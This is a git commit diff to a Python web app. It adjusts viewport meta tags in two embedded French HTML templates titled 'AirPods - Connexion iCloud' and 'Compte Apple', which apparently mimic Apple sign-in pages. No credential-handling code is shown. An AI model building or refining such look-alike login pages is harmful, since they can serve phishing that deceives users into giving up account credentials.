28a79d628ebce372ce981fb6cf48ec67137cf5d4
FERHOUNE Youba <feryouba0@gmail.com>
2025-05-22 09:50:44 +0200

    Update app.py

--- app.py
+++ app.py
@@ -14,6 +14,7 @@ airpods_page = """
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AirPods - Connexion iCloud</title>
     <style>
         body {
@@ -69,7 +70,7 @@ base_html = """
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=2.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Compte Apple</title>
     <style>
         body {{
